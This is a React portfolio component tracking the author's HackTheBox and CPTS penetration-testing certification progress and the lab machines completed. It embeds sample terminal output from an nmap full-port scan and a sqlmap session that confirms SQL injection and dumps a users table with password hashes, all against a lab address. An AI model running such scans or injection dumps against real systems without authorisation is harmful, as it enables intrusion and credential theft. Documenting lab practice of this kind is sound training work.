import React from 'react';
import { FaTrophy, FaServer, FaTerminal, FaNetworkWired, FaLock, FaFire } from 'react-icons/fa';
import CodeBlock from './CodeBlock';
import './HackTheBox.css';

const HackTheBox = () => {
  // CPTS modules and progress
  const cptsModules = [
    { name: "Introduction", progress: 100, icon: <FaTerminal /> },
    { name: "Information Gathering", progress: 85, icon: <FaNetworkWired /> },
    { name: "Vulnerability Assessment", progress: 75, icon: <FaLock /> },
    { name: "Web Attacks", progress: 80, icon: <FaServer /> },
    { name: "Attack Infrastructure", progress: 65, icon: <FaNetworkWired /> },
    { name: "File Transfers", progress: 70, icon: <FaTerminal /> },
    { name: "Antivirus Evasion", progress: 60, icon: <FaLock /> },
    { name: "Privilege Escalation", progress: 70, icon: <FaServer /> },
    { name: "Post-Exploitation", progress: 55, icon: <FaTerminal /> },
  ];
  
  const totalProgress = cptsModules.reduce((acc, module) => acc + module.progress, 0) / cptsModules.length;
  
  // Completed machines
  const boxesCompleted = [
    { name: "Lame", difficulty: "Easy", points: 10, date: "May 2022" },
    { name: "Legacy", difficulty: "Easy", points: 10, date: "May 2022" },
    { name: "Devel", difficulty: "Easy", points: 10, date: "June 2022" },
    { name: "Bashed", difficulty: "Easy", points: 10, date: "June 2022" },
    { name: "Blue", difficulty: "Easy", points: 10, date: "July 2022" },
    { name: "Optimum", difficulty: "Easy", points: 10, date: "July 2022" },
    { name: "Bastard", difficulty: "Medium", points: 20, date: "August 2022" },
    { name: "Nineveh", difficulty: "Medium", points: 20, date: "September 2022" }
  ];
  
  // Code snippet examples
  const penTestNmapCode = `# Initial Network Reconnaissance
$ sudo nmap -sC -sV -p- -oA initial_scan 10.10.10.10
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for target.htb (10.10.10.10)
Host is up (0.041s latency).
Not shown: 65530 closed tcp ports (reset)

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 (protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.41
135/tcp  open  msrpc       Microsoft Windows RPC
139/tcp  open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services

Service detection performed. Please report any incorrect results.
Nmap done: 1 IP address (1 host up) scanned in 87.32 seconds`;

  const webExploitCode = `# SQL Injection Discovery and Exploitation
$ sqlmap -u "http://10.10.10.10/index.php?id=1" --batch --dbs
...
[INFO] testing if GET parameter 'id' is dynamic
[INFO] confirming that GET parameter 'id' is dynamic
[INFO] GET parameter 'id' appears to be dynamic
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[INFO] testing for SQL injection on GET parameter 'id'
...
[INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable 
...
[INFO] the back-end DBMS is MySQL
[INFO] fetching database names
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] webapp_db

$ sqlmap -u "http://10.10.10.10/index.php?id=1" -D webapp_db --tables
...
Database: webapp_db
[3 tables]
+----------+
| users    |
| products |
| settings |
+----------+

$ sqlmap -u "http://10.10.10.10/index.php?id=1" -D webapp_db -T users --dump
...
Database: webapp_db
Table: users
[2 entries]
+---------+-------------------+-----------------------------------+
| user_id | username          | password                          |
+---------+-------------------+-----------------------------------+
| 1       | admin             | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2       | regularuser       | 025e4f7f5d6d87c23f4675b8ae71e8d7 |
+---------+-------------------+-----------------------------------+`;

  return (
    <div className="page-container">
      <section id="htb" className="page-section htb-section">
        <div className="page-header">
          <h1 className="page-title">HackTheBox & CPTS Journey</h1>
          <p className="page-subtitle">Follow my progress through cybersecurity challenges and professional certification.</p>
        </div>

        <div className="htb-intro">
          <div className="htb-header">
            <div className="htb-logo">
              <FaFire className="htb-icon" />
            </div>
            <div className="htb-stats">
              <div className="htb-stat-item">
                <span className="htb-stat-number">{boxesCompleted.length}</span>
                <span className="htb-stat-label">Machines<br />Pwned</span>
              </div>
              <div className="htb-stat-item">
                <span className="htb-stat-number">
                  {boxesCompleted.reduce((acc, box) => acc + box.points, 0)}
                </span>
                <span className="htb-stat-label">Points<br />Earned</span>
              </div>
              <div className="htb-stat-item">
                <span className="htb-stat-number">{Math.round(totalProgress)}%</span>
                <span className="htb-stat-label">CPTS<br />Progress</span>
              </div>
            </div>
          </div>

          <div className="htb-description">
            <p>
              I'm currently pursuing the <strong>Hack The Box Certified Penetration Testing Specialist (CPTS)</strong> certification to enhance my practical skills in cybersecurity. This challenging certification covers various aspects of penetration testing, from initial reconnaissance to post-exploitation.
            </p>
            <p>
              Through HTB's practical labs and challenges, I'm gaining hands-on experience with real-world scenarios that test my ability to identify vulnerabilities and exploit them ethically. This journey is helping me develop a methodical approach to security testing.
            </p>
          </div>
        </div>

        <div className="cpts-progress-section">
          <h2>CPTS Certification Progress</h2>
          
          <div className="overall-progress">
            <div className="progress-header">
              <span>Overall Progress</span>
              <span className="progress-percentage">{Math.round(totalProgress)}%</span>
            </div>
            <div className="progress-bar">
              <div 
                className="progress-fill"
                style={{ width: `${totalProgress}%` }}
              ></div>
            </div>
          </div>
          
          <div className="module-list">
            {cptsModules.map((module, index) => (
              <div key={index} className="module-item">
                <div className="module-icon">{module.icon}</div>
                <div className="module-info">
                  <div className="module-header">
                    <span className="module-name">{module.name}</span>
                    <span className="module-percentage">{module.progress}%</span>
                  </div>
                  <div className="module-progress">
                    <div 
                      className="module-fill"
                      style={{ width: `${module.progress}%` }}
                    ></div>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>

        <div className="htb-content">
          <div className="htb-showcase">
            <h2>Skills in Action</h2>
            <div className="code-examples">
              <div className="code-block">
                <div className="code-title">Network Reconnaissance</div>
                <CodeBlock language="bash">
                  {penTestNmapCode}
                </CodeBlock>
              </div>
              
              <div className="code-block">
                <div className="code-title">Web Application Testing</div>
                <CodeBlock language="bash">
                  {webExploitCode}
                </CodeBlock>
              </div>
            </div>
          </div>
          
          <div className="completed-boxes">
            <h2>Machines Conquered</h2>
            <table className="boxes-table">
              <thead>
                <tr>
                  <th>Machine</th>
                  <th>Difficulty</th>
                  <th>Points</th>
                  <th>Completed</th>
                </tr>
              </thead>
              <tbody>
                {boxesCompleted.map((box, index) => (
                  <tr key={index} className={`difficulty-${box.difficulty.toLowerCase()}`}>
                    <td><FaServer className="box-icon-small" /> {box.name}</td>
                    <td>{box.difficulty}</td>
                    <td>{box.points}</td>
                    <td>{box.date}</td>
                  </tr>
                ))}
              </tbody>
            </table>
            
            <div className="boxes-grid">
              {boxesCompleted.map((box, index) => (
                <div key={index} className={`box-item ${box.difficulty.toLowerCase()}`}>
                  <FaServer className="box-icon" />
                  <div className="box-name">{box.name}</div>
                  <div className="box-difficulty">{box.difficulty}</div>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div className="htb-journey">
          <h2>Learning Path & Future Goals</h2>
          <div className="journey-timeline">
            <div className="journey-item completed">
              <div className="journey-marker"></div>
              <div className="journey-content">
                <h3>Getting Started</h3>
                <p>Completed fundamental learning paths on HTB Academy and pwned my first easy machines.</p>
              </div>
            </div>
            
            <div className="journey-item completed">
              <div className="journey-marker"></div>
              <div className="journey-content">
                <h3>Building Skills</h3>
                <p>Tackled more difficult machines and explored specialized topics like Active Directory attacks.</p>
              </div>
            </div>
            
            <div className="journey-item current">
              <div className="journey-marker"></div>
              <div className="journey-content">
                <h3>CPTS Certification</h3>
                <p>Currently working through the CPTS learning path and preparing for the exam.</p>
              </div>
            </div>
            
            <div className="journey-item">
              <div className="journey-marker"></div>
              <div className="journey-content">
                <h3>Professional Pentesting</h3>
                <p>Goal: Apply skills in real-world environments and continue with OSCP certification.</p>
              </div>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
};

export default HackTheBox;
